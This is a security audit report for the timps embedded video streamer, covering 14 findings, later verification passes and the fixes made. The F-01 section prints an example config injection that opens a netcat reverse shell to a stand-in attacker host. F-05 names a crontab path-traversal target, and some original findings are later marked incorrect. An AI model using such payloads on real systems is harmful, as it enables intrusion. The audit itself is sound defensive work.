# timps - Security & Bug Audit 2026-07-23

Comprehensive code review of the **timps** (Tiny IMP Streamer) project.
Conducted on July 23, 2026 via static code analysis.

---

## Summary

Overall, the project is **written very cleanly**, with an exceptionally
high level of security awareness for embedded C code. Numerous
defense-in-depth measures, constant-time comparisons for authentication,
careful bounds checking, clamping of numeric values, and a well-thought-out
thread-safety architecture.

**14 findings** were identified, of which **2 critical**, **4 high/medium**,
and **8 low/informational**.

---

## Verification & Fix Status (2026-07-24)

The findings were cross-checked against the actual code. Result:

| Finding | Verification | Status |
|---|---|---|
| **F-01** `switch_cmd`→`system()` | ✅ real (but precondition: write access to `/etc/timps.conf` = already privileged). Practically **Medium**, not Critical. | **FIXED** - `daynight.c` now uses `fork()`+`execlp()` (no shell, no injection). |
| **F-02** `isp_path` file read | ⚠️ **over-rated**: `dn_brightness()` only parses ISP status numbers and returns **no file content** → no info leak. Precondition = config write access. | **downgraded to LOW** (prefix check `/proc/jz/isp/` optional; not an emergency). |
| **F-03** unclamped audio params | ✅ real (`volume/gain/alc_gain/spk_*` = `pint`, only `ns` clamped). Fields are `int` (no wraparound in the struct), but clamping against absurd IMP values makes sense. | **FIXED** - `pint_cl` (volume/gain/spk 0..100, alc_gain 0..7). |
| **F-04** OSD `logo_w/h`/`outline` | ✅ `pint`, **but impact already caught** (`setup_logo` H5 discard + `load_bgra` `w/h<=0`→NULL). | **FIXED** (defensive) - `logo_w/h` 0..4096, `outline` 0..64. |
| **F-05** `record_clip` traversal | ❌ **INCORRECT** - `record_clip` validates strongly: `/tmp/` prefix + `strstr("..")` + `open(O_EXCL|O_NOFOLLOW,0600)`. | **not an issue** (removed from list). |
| **F-06** `daynight.*` missing in `set_kv` | ❌ **INCORRECT** - `config.c:664-674` has the full `daynight.` branch in `set_kv`, likewise `config_get_kv`. | **not an issue** (removed from list). |
| **F-08** `hal_get()` NULL deref | ✅ theoretical (backend is static, never NULL), but cheap. | **FIXED** - NULL check in `main.c`. |
| **F-07, F-09-F-14** | correctly rated as low/informational resp. "no risk"/"positive". | unchanged (deliberate design / acceptable). |

**Net result:** Of the 2 "critical" findings, one is legitimate hardening
(F-01, fixed), the other over-rated (F-02, no leak). Two "medium" findings
(F-05, F-06) were **incorrect** - the code already does it right. The four
worthwhile fixes (F-01/F-03/F-04/F-08) have been implemented and verified
with `make sim`.

---

## Re-verification of the fixes (2026-07-26)

The four fixes from the 2026-07-24 pass were cross-checked (Fable 5,
independent of the self-assessment above), and additionally a complete
path/function sweep was run across all ~30 source files (Sonnet) to look
for findings the original audit had missed. Result:

| # | Finding | Status |
|---|---|---|
| F-01 | `execlp()` fix correct: no shell, clean child (`/dev/null` redirect, `_exit`, `waitpid` EINTR loop), no zombies. Behavior change: `switch_cmd` with embedded arguments no longer works (but this was never documented that way - the contract was always `<cmd> day\|night`). | confirmed, no fix needed |
| F-03 | `audio.gain` was clamped too loosely with `pint_cl(val,0,100)` - IMP documents `gain` as 0..31 (PGA range), not 0..100. | **FIXED** - `config.c` clamp is now `0..31`. |
| F-04 | Clamps correct, purely defensive, no regression. | confirmed |
| F-08 | The NULL check was present in `main.c`, but `hal_get()->name` was already dereferenced unchecked in the log line before it. | **FIXED** - `g_hal = hal_get()` + NULL check now run before first use; the log line uses `g_hal->name`. |
| **NEU-01** | `motion.on_motion` (`src/hal/imp_motion.c`) still went through `system()` - exactly the same finding class as F-01, but the `fork()`/`execlp()` fix had only been rolled out in `daynight.c`. Found consistently by both independent reviews (Fable 5 and Sonnet). | **FIXED** - same pattern as F-01, via double fork (so the motion-analysis thread doesn't wait on the script, as the old `"cmd &"` did); grandchild is reaped by init. |

Nothing else new found - the RTSP/RTP/HTTP/SRT parsers, codec buffers
(`nal.c`/`vparam.c`/`aac.c`/`g711.c`), font rendering (`msttf.c`), auth
(`auth.c`/`control.c`), and thread safety (`hub.c`/`fanqueue.c`) were
re-checked during the sweep and remain clean.

---

## Findings

### 🔴 F-01 - Command Injection via `daynight.switch_cmd` in `system()`

| Field | Value |
|------|------|
| **File** | `src/daynight.c:148-151` |
| **Severity** | 🔴 Critical |
| **Exploitability** | Config file access required |
| **Impact** | Root shell execution |

```c
snprintf(cmd, sizeof cmd, "%s %s >/dev/null 2>&1",
         g_cfg.daynight.switch_cmd, arg);
int rc = system(cmd);
```

`daynight.switch_cmd` is passed to `system()` unvalidated. The key is not
settable via `/control`, but an attacker with write access to
`/etc/timps.conf` can inject arbitrary shell commands:

```ini
daynight.switch_cmd = reboot; nc -e /bin/sh attacker.com 4444 #
```

**Recommendation:** Use `fork()`/`exec()` instead of `system()`, or validate
against a path whitelist (e.g. only `/usr/sbin/daynight`, `daynight`).

---

### 🔴 F-02 - Arbitrary File Read via `daynight.isp_path`

| Field | Value |
|------|------|
| **File** | `src/daynight.c` - `dn_brightness()` |
| **Severity** | 🔴 Critical |
| **Exploitability** | Config file access required |
| **Impact** | Reading arbitrary files as root |

`daynight.isp_path` (default: `/proc/jz/isp/isp-m0`) is used in `fopen()`.
The key is not settable via `/control`, but an arbitrary path such as
`/etc/shadow` can be entered in the config file. The process runs as root
→ information leak.

**Recommendation:** Restrict `isp_path` to a `/proc/jz/isp/` prefix, or
hard-code it to the known path.

---

### 🟠 F-03 - `audio.volume` / `audio.gain` / `audio.alc_gain` unclamped

| Field | Value |
|------|------|
| **File** | `src/config.c` - `set_kv()`, audio section |
| **Severity** | 🟠 Medium |
| **Exploitability** | `/control` (auth required) |
| **Impact** | IMP crash / DoS / value divergence |

```c
// NO range check:
else if(!strcmp(k,"volume"))    c->audio.volume    = pint(val);
else if(!strcmp(k,"gain"))      c->audio.gain      = pint(val);
else if(!strcmp(k,"alc_gain"))  c->audio.alc_gain  = pint(val);
else if(!strcmp(k,"spk_volume"))c->audio.spk_volume = pint(val);
else if(!strcmp(k,"spk_gain"))  c->audio.spk_gain  = pint(val);
```

Extremely large or negative values are passed unchanged to the IMP API and
can silently wrap around when cast to `uint8_t` (e.g. `300` → `44`) or
trigger undefined behavior.

**Recommendation:** Clamp all of them with `pint_cl(val, ...)` to the
documented IMP ranges: `volume` 0-100, `gain` 0-31, `alc_gain` 0-7, etc.

---

### 🟠 F-04 - OSD `logo_w` / `logo_h` / `outline` unclamped

| Field | Value |
|------|------|
| **File** | `src/config.c` - `set_osd_item()` |
| **Severity** | 🟡 Medium |
| **Exploitability** | `/control` (auth required) |
| **Impact** | Memory exhaustion / crash |

```c
else if(!strcmp(k,"logo_w")||...) o->logo_w = pint(val);
else if(!strcmp(k,"logo_h")||...) o->logo_h = pint(val);
else if(!strcmp(k,"outline")||...) o->outline = pint(val);
```

Negative or extremely large values (e.g. `logo_w = -1`) can lead to huge
memory allocations in the OSD rendering pipeline.

**Recommendation:** `pint_cl(val, 0, 1920)` for `logo_w/h`, `pint_cl(val, 0, 32)`
for `outline`.

---

### 🟡 F-05 - Check path validation in `record_clip()`

| Field | Value |
|------|------|
| **File** | `src/control.c:380-386` → `src/record.c` `record_clip()` |
| **Severity** | 🟡 Medium |
| **Exploitability** | `/control` (auth required) |
| **Impact** | File overwrite outside the recording directory |

```c
char clip[160];
if (get_val(sb, se, "clip", clip, sizeof clip)){
    int secs = get_val(sb, se, "seconds", v, sizeof v) ? atoi(v) : 6;
    record_clip(clip, secs);
}
```

The clip path comes from the client via `/control`. If `record_clip()`
does not perform `has_dotdot()` validation, an authenticated user could
overwrite arbitrary files (e.g. `../../../etc/crontab`).

**Recommendation:** Apply the same `has_dotdot()` validation as in the
normal recorder.

---

### 🟡 F-06 - `daynight.*` keys missing in `set_kv()` / `config_get_kv()`

| Field | Value |
|------|------|
| **File** | `src/config.c` - `set_kv()` / `config_get_kv()` |
| **Severity** | 🟡 Medium |
| **Exploitability** | Inconsistency |
| **Impact** | In-memory values and the config file drift apart |

`set_kv()` does not handle `daynight.*` keys. When `config_apply_kv()` is
called with a `daynight.*` key, `set_kv()` falls through all branches - the
key is written ONLY to the file, the in-memory value remains unchanged
(`config_get_kv()` returns `0` = "unknown"). This can cause the `/control`
change-detection dedup to work incorrectly.

**Recommendation:** Fully add `daynight.*` keys to `set_kv()` and
`config_get_kv()`.

---

### 🟢 F-07 - `sensor.model` is always overwritten with the `/proc` value

| Field | Value |
|------|------|
| **File** | `src/config.c:1070-1090` - `config_sensor_finalize()` |
| **Severity** | 🟢 Low (deliberate design) |
| **Impact** | `/control` value is silently ignored |

```c
if (c->sensor.model[0] && strcasecmp(c->sensor.model, name) != 0)
    LOGW(MOD,"config sensor.model '%s' != loaded driver '%s' - using '%s' ...");
copystr(c->sensor.model, name, MS_MAX_STR);
/* ^^^ ALWAYS overwrites, even when only a warning is logged */
```

This is deliberate design (a wrong sensor name → kernel crash), but a user
who sets `sensor.model` via `/control` gets no visible error message.

**Recommendation:** Return a warning in the response body on `/control`
writes to `sensor.model`.

---

### 🟢 F-08 - `hal_get()` return value not checked for `NULL`

| Field | Value |
|------|------|
| **File** | `src/main.c:107` |
| **Severity** | 🟢 Low (theoretical) |
| **Impact** | Immediate crash on `NULL` |

```c
g_hal = hal_get();
if (g_hal->init(&g_cfg)!=0){ ... }
/* ^^^ no NULL check before dereferencing */
```

**Recommendation:** `if (!g_hal || g_hal->init(...))` as a defensive
measure.

---

### 🟢 F-09 - `auth_gen_token()` fallback without `/dev/urandom` is weak

| Field | Value |
|------|------|
| **File** | `src/auth.c:119-128` |
| **Severity** | 🟢 Low (only on broken systems) |
| **Impact** | Weak nonces when `/dev/urandom` is missing |

The fallback hashes `time/pid/rand/clock` via MD5 - documented as weak,
but only relevant if `/dev/urandom` is missing, which is never the case
on normal Linux systems.

**Recommendation:** Optional: try the `getrandom()` syscall as the first
alternative before `/dev/urandom`.

---

### 🟢 F-10 - `rand()` for UDP port selection

| Field | Value |
|------|------|
| **File** | `src/rtsp/rtsp.c:430` |
| **Severity** | 🟢 Low |
| **Impact** | Port collisions with many clients |

```c
base = 6000 + ((rand() % 8192) & ~1);
```

`rand()` is acceptable for ports, but inconsistent with the rest of the
code, which prefers `/dev/urandom`. Retry logic (64 attempts) limits the
damage.

**Recommendation:** Optional: draw from `/dev/urandom` instead of `rand()`.

---

### 🟢 F-11 - `send_resp()` 3072-byte stack buffer

| Field | Value |
|------|------|
| **File** | `src/rtsp/rtsp.c:308` |
| **Severity** | 🟢 Low |
| **Impact** | Stack usage on the T10 (64MB) is borderline |

```c
char hdr[3072];
```

3KB on the stack adds up together with other threads. No buffer overflow
thanks to the L2 fixes.

**Recommendation:** Shrink the buffer or move it to the heap if stack
issues occur on the T10.

---

### 🟢 F-12 - `daynight.isp_path`: theoretical TOCTOU

| Field | Value |
|------|------|
| **File** | `src/daynight.c` - `dn_brightness()` |
| **Severity** | 🟢 Low (not practically exploitable) |
| **Impact** | Symlink attack between `fopen()` calls |

`/proc/jz/isp/` is root-only → not practically exploitable.

**Recommendation:** Also addressed by the F-02 fix (prefix validation).

---

### 🟢 F-13 - HTTP path injection in `serve_player()` - no risk

| Field | Value |
|------|------|
| **File** | `src/mp4/httpd.c` `serve_player()` |
| **Severity** | 🟢 No risk |
| **Impact** | None |

`vcodec` comes from SPS bytes (hex), `chn` from `atoi()` - both guaranteed
safe. No XSS vector.

---

### 🟢 F-14 - `daynight.switch_cmd` / `isp_path` not settable via `/control`

| Field | Value |
|------|------|
| **File** | `src/control.c` |
| **Severity** | 🟢 Positive |
| **Impact** | Protection layer present |

These critical keys are deliberately not included in `/control`'s
`DN_KEYS`. Good - this should remain documented and never accidentally
be added.

---

## ✅ Positive practices worth highlighting

| Measure | Location |
|---|---|
| **Constant-time token/password comparison** | `auth_token_eq()`, `auth_http_basic()`, `auth_rtsp_digest()` |
| **Per-session digest nonce validation** | `rtsp.c` - prevents replay attacks |
| **Clamping of numeric values** (`pint_cl`) | `config.c` - prevents out-of-range crashes |
| **Sanitizing of `/control` values** | `sanitize_val()` in `control.c` |
| **Path traversal protection** (`has_dotdot`) | `record.c`, `timelapse.c` |
| **Client limits against DoS** | `HTTP_MAX_CLIENTS`, `RTSP_MAX_CLIENTS`, `SRT_MAX_CLIENTS`, `HUB_MAX_SUBS` |
| **Socket timeout** | `net_set_timeouts()` in `net.c` |
| **Thread-safe hub publish/unsubscribe** | `g_pushing[src]` handshake in `hub.c` |
| **Atomic config file persistence** | `config_write_keys()` with `mkstemp` + `fsync` + `rename` |
| **CORS restricted to specific paths & origin reflection** | `http_cors()` in `httpd.c` |
| **TLS handshake timeout** | `ms_tls_accept()` in `tls.c` |
| **Stack protector + FORTIFY_SOURCE** | `build.sh` with `HARDEN`/`FORTIFY` |
| **CLOCK_MONOTONIC for condvars** | `fanqueue.c`, `events.c` - immune to NTP jumps |

---

## Recommended fix prioritization

| Priority | Finding | Effort | File |
|-----------|---------|---------|-------|
| 1 | **F-01** `system()` → `fork()`/`exec()` | 15 min | `daynight.c` |
| 2 | **F-02** validate `isp_path` / `switch_cmd` | 10 min | `config.c` |
| 3 | **F-03** clamp audio parameters | 5 min | `config.c` |
| 4 | **F-04** clamp OSD `logo_w/h`/`outline` | 5 min | `config.c` |
| 5 | **F-05** `record_clip` path validation | 5 min | `record.c` |
| 6 | **F-06** `daynight.*` in `set_kv()`/`config_get_kv()` | 10 min | `config.c` |
| 7 | **F-08** `hal_get()` NULL check | 1 min | `main.c` |

**Total effort: approx. 50 minutes** - all changes are backward compatible.

---

## Risk matrix

| # | Problem | Exploitability | Impact | Risk |
|---|---------|----------------|--------|--------|
| F-01 | `switch_cmd` command injection | Config file access | Root shell | 🔴 Critical |
| F-02 | `isp_path` arbitrary file read | Config file access | Data leak | 🔴 Critical |
| F-03 | Unclamped audio parameters | `/control` (auth) | IMP crash/DoS | 🟠 Medium |
| F-04 | Unclamped OSD `logo_w/h` | `/control` (auth) | Memory/DoS | 🟡 Medium |
| F-05 | `record_clip` path validation | `/control` (auth) | File overwrite | 🟡 Medium |
| F-06 | `daynight.*` keys inconsistent | `/control` (auth) | Configuration error | 🟡 Medium |
| F-07 | `sensor.model` overwrite | `/control` (auth) | Confusion | 🟢 Low |
| F-08 | `hal_get()` NULL deref | Startup | Crash | 🟢 Low |
| F-09 | `auth_gen_token()` fallback | No `/dev/urandom` | Weak nonces | 🟢 Low |
| F-10 | `rand()` for UDP ports | Network | Collisions | 🟢 Low |
| F-11 | 3KB stack buffer | T10 (64MB) | Stack usage | 🟢 Low |
| F-12 | `isp_path` TOCTOU | Local + root | Theoretical | 🟢 Low |
| F-13 | HTTP path injection | Network | None | ✅ No risk |
| F-14 | Critical keys not exposed via `/control` | - | Positive | ✅ Protection |
